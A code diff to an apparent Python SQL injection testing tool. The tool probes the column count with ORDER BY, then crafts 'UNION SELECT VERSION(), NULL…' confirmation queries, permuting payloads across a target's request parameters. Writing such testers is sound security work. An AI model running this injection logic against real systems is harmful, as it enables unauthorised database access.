@@ -112,10 +112,11 @@ def send_confirmation_request(original_request_data, number_of_columns, request,
 
     columns_values = ['VERSION()']
 
-    for i in range(1, number_of_columns): # skip a column, first one is replaced by the version command
-        columns_values.append(i)
+    for _ in range(1, number_of_columns): # skip a column, first one is replaced by the version command
+        columns_values.append('NULL') # NULL allows to avoid type errors
 
-    for column_value in list(itertools.permutations(columns_values)):
+    # use set to remove repetitions
+    for column_value in set(itertools.permutations(columns_values, number_of_columns)):
         confirmation_query = 'UNION SELECT '
 
         for column_val in column_value:
@@ -174,10 +175,9 @@ def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_r
     for request in requests_dict:
         final_url = TARGET + request['url']
 
-        if len(request['parameters']) > 1 and 1 == len(request['payloads']):
-            # append valid values to allows permutations (single payload in different parameters)
+        if len(request['parameters']) > len(request['payloads']):
             for _ in range(len(request['parameters']) - len(request['payloads'])):
-                request['payloads'].append('valid_string')
+                request['payloads'].append('valid_string') # append a valid value for each parameter 
 
         # set current ORDER BY value
         current_column_number = 1
@@ -189,9 +189,9 @@ def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_r
             end_loop = False
 
             noc_command_in_payloads = COMMAND_COLUMNS_NUMBER in request['payloads']
-            
+
             # permutations of payloads based on parameters length
-            for payload in list(itertools.permutations(request['payloads'], len(request['parameters']))):
+            for payload in set(itertools.permutations(request['payloads'], len(request['parameters']))):
                 # if payload contains the command to find the number of columns and the run is set to sql mode 
                 if noc_command_in_payloads and is_sql_run:
                     for pre_order_by_value in pre_order_by_values[:]: # loop over a copy of the list because elements can be removed
@@ -230,8 +230,6 @@ def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_r
                         data[request['parameters'][i]] = payload[i]
                     
                     response = send_request(request, data, final_url)
-
-                    end_loop = True
 
                     if 404 == response.status_code:
                         if DEBUG:
@@ -272,7 +270,7 @@ def main(mode, irequests, ipayloads):
     except ValueError:
         exit()
     except IndexError:
-        print('Error: mismatching rows number between requests-details and payloads files')
+        print('Error: mismatching rows number between requests details and payloads files')
         exit()
     except FileNotFoundError:
         print('Error: file not found. Check command-line options')
